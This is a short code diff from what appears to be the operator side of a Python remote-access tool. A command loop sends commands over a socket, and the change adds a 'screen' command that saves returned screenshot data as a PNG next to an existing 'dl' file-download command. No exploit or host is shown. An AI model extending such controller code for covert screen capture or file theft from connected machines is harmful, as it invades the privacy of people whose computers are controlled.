@@ -59,6 +59,8 @@ while True:
     command_split = command.split(" ")
     if len(command_split) == 2 and command_split[0] == "dl":
         dl_filename = command_split[1]
+    elif len(command_split) == 2 and command_split[0] == "screen":
+        dl_filename = command_split[1] + ".png"
 
     data_received = socket_send_and_receive_all_data(connection_socket, command)
     if not data_received:
